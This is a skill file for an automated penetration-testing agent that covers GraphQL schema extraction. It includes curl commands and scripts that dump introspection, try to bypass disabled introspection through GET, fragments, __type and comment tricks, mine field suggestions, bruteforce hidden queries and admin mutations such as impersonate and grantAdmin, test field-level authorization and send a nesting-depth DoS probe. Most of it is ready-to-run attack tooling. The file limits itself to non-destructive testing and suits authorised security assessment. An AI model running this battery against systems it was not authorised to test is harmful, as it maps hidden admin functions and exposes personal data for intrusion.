---
name: graphql_introspection
agent: agent3_endpoints
description: GraphQL schema extraction — introspection dump, disabled-introspection bypasses, and field-suggestion bruteforce for hidden queries and mutations.
---

# GraphQL Introspection

## Purpose

A GraphQL endpoint is a queryable database schema wearing an API costume — and introspection hands you the entire map: every type, every field, every mutation, every argument. Even when introspection is "disabled," field suggestions (`Did you mean...`), `__typename` probing, and bruteforced field names rebuild most of it. Undocumented mutations (`deleteUser`, `impersonate`, `grantAdmin`) and over-exposed fields (password hashes, internal IDs, PII) are the findings. This skill detects GraphQL endpoints, dumps the schema by every available means, and verifies each interesting field live.

## Division of labor

- **Consumes:** candidate GraphQL URLs — `/graphql`, `/api/graphql`, `/gql` hits from `recursive_fuzz_loop`; GraphQL playground/GraphiQL pages from `docs_swagger_probe`; JS references to `graphql`/`gql`/`__typename`.
- **Produces:** the finished artifact — `findings/graphql_introspection.md`: endpoint URL, introspection status, schema summary (types/queries/mutations counts), interesting fields/mutations with live-verification results, and the saved schema (`evidence/schema_<host>.json`).

## When to use / when NOT to use

- **Use when:** any `/graphql`-like path 200s/400s; a playground/GraphiQL page loads; JS contains `__typename` or `graphql(` calls; POSTing `{"query":"{__typename}"}` returns anything but the baseline 404.
- **Skip when (time-pass filter):** all candidate paths return the identical fallback/404 signature AND no JS references exist (document the sweep once); the endpoint requires auth AND returns identical "not authenticated" for every query shape (that's a session gate — note it for credentialed testing, don't burn introspection tricks on it).

## Methodology

1. **Detect the endpoint.** For each candidate path, POST `{"query":"{__typename}"}` with `Content-Type: application/json`. A JSON response containing `__typename`/`Query`/`data` = GraphQL. A 400 with a GraphQL-flavored error (`"errors":[{"message":...}]`) = GraphQL behind validation. Also try GET with `?query={__typename}` — some servers allow GET.
2. **Run full introspection.** POST the standard introspection query. If it returns the schema, save it to `evidence/schema_<host>.json` immediately — this is the jackpot, everything after is analysis.
3. **If introspection is disabled, run the bypass battery** (one at a time, verify each):
   - GET instead of POST: `GET /graphql?query={__schema{types{name}}}`
   - `{"query": "query{__schema{types{name}}}"}` with different casing/whitespace tricks
   - Fragment-based: `query{...F} fragment F on Query{__schema{types{name}}}`
   - `__type(name:"Query")` instead of `__schema` (some blocklists only cover `__schema`)
   - Line-break/comment injection inside the query: `query{\n__schema\n{types{name}}}`, `query{__/**/schema{types{name}}}`
   - Batching: `[{"query":"{__typename}"},{"query":"{__schema{types{name}}}"}]` (batch endpoints sometimes skip the introspection guard on non-first items)
   - Persisted-query / APQ hash tricks are out of scope unless the app documents them.
4. **Mine field suggestions.** Send deliberately wrong field names: `{__typenam}`, `{userz}`, `{adminn}`. A `Did you mean "users"?` response leaks real field names — harvest every suggestion. This works on many "hardened" endpoints.
5. **Probe `__typename` on objects.** `{__typename}` at the root; then on discovered types via inline fragments. Typename responses confirm type existence without full introspection.
6. **Bruteforce fields and mutations.** Using tier-1 words from `wordlist_target_derived` + the built-in list below, query `{<word>}`, `{<word>{id}}`, `mutation{<word>}`. A `Cannot query field` error = dead; a data response or a *different* error (auth/args-required) = the field EXISTS — args-required means it's real, hand the args to `param_mining`-style argument testing.
7. **Enumerate mutations specifically.** Try the built-in mutation list; each hit gets argument-probed (`mutation{<m>(input:{})}` → read the "required argument" errors, they name the args). Mutations that change state get tested for auth, never for destructive effect — read the response, don't delete data.
8. **Analyze the schema for gold.** Given a schema (dumped or reconstructed), flag: fields returning PII/hashes/tokens (`passwordHash`, `ssn`, `apiKey`, `email`, `phone`); mutations with admin verbs (`delete`, `impersonate`, `grant`, `promote`, `bypass`); deprecated fields still live; interfaces/unions exposing more than the concrete types; directives like `@auth`/`@hasRole` (tells you the auth model — and which fields lack it).
9. **Test field-level auth.** For 5–10 sensitive fields, query them unauthenticated vs with a low-privilege context if available. A field the schema marks `@auth` but that returns data unauthenticated = broken field-level authorization — verify 2x.
10. **Check for nested depth/cost abuse.** One query with 10x nested fields (`{a{b{c{d{e{f{g{h{i{j{id}}}}}}}}}}}`); if it returns without a depth/complexity error, note the DoS primitive (single probe, no sustained load).
11. **Write the report**: endpoint, introspection status + which bypass worked (if any), schema stats, interesting fields/mutations table with live-verification, field-auth test results, saved schema path.

Built-in field/mutation candidates (extend with tier-1 words):
```
# queries
me user users account accounts profile admin admins
config settings system health version debug
order orders payment payments invoice invoices
token tokens session sessions key keys
search export report reports analytics
# mutations
login logout register createUser updateUser deleteUser
impersonate grantAdmin promoteUser resetPassword
createApiKey deleteApiKey updateSettings exportData
```

Decision branches: introspection 200s → save schema, go to analysis · introspection blocked → bypass battery in order · suggestions leak names → harvest loop until suggestions dry up · field exists but needs args → probe args via error messages · mutation found → auth-test, never destructive · `@auth` field returns data unauth → headline finding, verify 2x.

## Exact commands

Detection probe:
```bash
curl -sS --max-time 15 -X POST "https://<HOST>/graphql" \
  -H 'Content-Type: application/json' \
  -d '{"query":"{__typename}"}' | head -c 400; echo
# GraphQL if: {"data":{"__typename":"Query"}} or {"errors":[...]}
```

Full introspection query (save on success):
```bash
curl -sS --max-time 30 -X POST "https://<HOST>/graphql" \
  -H 'Content-Type: application/json' \
  -d '{"query":"query{__schema{queryType{name}mutationType{name}types{...F}}} fragment F on __Type{name kind fields{name type{name kind}} inputFields{name}}"}' \
  -o evidence/schema_probe.json
python3 -c "
import json; s=json.load(open('evidence/schema_probe.json'))
t=s['data']['__schema']['types']
print('introspection LIVE, types:', len(t))
" && cp evidence/schema_probe.json evidence/schema_<HOST>.json
```

Introspection bypass battery:
```bash
G="https://<HOST>/graphql"
echo "== GET =="
curl -sS --max-time 15 -G "$G" --data-urlencode 'query={__schema{types{name}}}' | head -c 200; echo
echo "== __type =="
curl -sS --max-time 15 -X POST "$G" -H 'Content-Type: application/json' \
  -d '{"query":"{__type(name:\"Query\"){fields{name}}}"}' | head -c 300; echo
echo "== fragment =="
curl -sS --max-time 15 -X POST "$G" -H 'Content-Type: application/json' \
  -d '{"query":"query{...F} fragment F on Query{__schema{types{name}}}"}' | head -c 200; echo
echo "== comment =="
curl -sS --max-time 15 -X POST "$G" -H 'Content-Type: application/json' \
  -d '{"query":"query{__/**/schema{types{name}}}"}' | head -c 200; echo
```

Field-suggestion mining:
```bash
for w in userz adminn __typenam mutationn; do
  echo "== $w =="
  curl -sS --max-time 15 -X POST "https://<HOST>/graphql" \
    -H 'Content-Type: application/json' \
    -d "{\"query\":\"{$w}\"}" | head -c 300; echo
done
# harvest every "Did you mean" suggestion; loop new names until dry
```

Field bruteforce (tier-1 words + built-ins):
```bash
while read -r w; do
  r=$(curl -sS --max-time 15 -X POST "https://<HOST>/graphql" \
    -H 'Content-Type: application/json' -d "{\"query\":\"{$w{id}}\"}")
  echo "$r" | grep -q 'Cannot query field' || echo "EXISTS?: $w -> $(echo "$r" | head -c 150)"
done < wordlists/graphql_fields.txt
```

Schema analysis (flag gold):
```bash
python3 - <<'EOF'
import json, re
s = json.load(open("evidence/schema_<HOST>.json"))["data"]["__schema"]
names = []
for t in s["types"]:
    for f in (t.get("fields") or []):
        names.append((t["name"], f["name"]))
pat = re.compile(r'passw|secret|token|api[_-]?key|ssn|social|phone|email|hash|internal|admin', re.I)
for t, f in names:
    if pat.search(f): print(f"SENSITIVE? {t}.{f}")
muts = [t for t in s["types"] if t["name"] == (s.get("mutationType") or {}).get("name")]
for m in muts:
    for f in (m.get("fields") or []): print(f"MUTATION {f['name']}")
print(f"types={len(s['types'])} fields={len(names)}")
EOF
```

Depth/cost probe (single request):
```bash
q='{a{b{c{d{e{f{g{h{i{j{__typename}}}}}}}}}}}'
curl -sS --max-time 20 -X POST "https://<HOST>/graphql" \
  -H 'Content-Type: application/json' -d "{\"query\":\"$q\"}" -o /dev/null \
  -w 'depth10: %{http_code} %{size_download} %{time_total}\n'
```

## Completion-bias defenses

- [ ] All candidate paths probed with `{__typename}` (POST and GET)
- [ ] Full introspection attempted; schema saved on success
- [ ] Bypass battery run in order (GET / __type / fragment / comment / batching) if disabled
- [ ] Field-suggestion mining looped until suggestions dry up
- [ ] `__typename` probed on discovered types
- [ ] Field bruteforce run (tier-1 words + built-ins); exists-vs-dead judged by error type
- [ ] Mutations enumerated; arguments probed via required-arg errors (non-destructive)
- [ ] Schema analyzed for sensitive fields, admin mutations, auth directives
- [ ] Field-level auth tested on 5–10 sensitive fields
- [ ] Depth/cost probe run once
- [ ] `findings/graphql_introspection.md` written + schema saved to `evidence/`

- **Review step:** agent10_review must verify: (1) "introspection disabled" claims show the full bypass battery was actually run; (2) every "field exists" claim includes the non-`Cannot-query-field` evidence; (3) mutations were tested non-destructively; (4) sensitive-field claims show live query responses.
- **Nudge prompts:**
  - "'Introspection disabled' is the beginning, not the end. Suggestions, __type, fragments, and bruteforce rebuild most of the schema — run all of them."
  - "A field that errors on missing arguments EXISTS. Read the error — it names the arguments. That's the schema talking."
  - "Mutations are tested for auth, never for effect. Read the response, don't delete the data."
- **Finished artifact definition:** `findings/graphql_introspection.md` on disk: endpoint URL, introspection status (and which bypass worked), schema stats, interesting fields/mutations table with live-verification results, field-auth test results; plus `evidence/schema_<host>.json` when introspection (or bypass) succeeded.

## Evidence standard

- Baseline: candidate-path probes compared against the host 404 baseline (a GraphQL-flavored 400 ≠ GraphQL confirmed — need `data`/`errors` structure).
- Reproduction: each claimed field/mutation re-queried 2x — stable to CONFIRMED.
- Raw evidence: query sent + full JSON response per claimed field/mutation; saved schema file.
- Verdicts: CONFIRMED (live-verified field/mutation + raw pairs) / INCONCLUSIVE (exists-signal once, unstable) / NEGATIVE (no GraphQL surface — documented with probe list).

## Handoffs

- `param_mining`: mutation/query argument names discovered via error messages — treat as parameters.
- Downstream auth agents: mutations and sensitive fields with weak/absent field-level auth.
- Downstream IDOR agents: object-typed fields (`user(id:)`, `order(id:)`) — IDOR entry points.
- `wordlist_target_derived`: schema type/field names feed back as tier-1 words.
- `agent10_review`: the introspection report + saved schema for the review gate above.
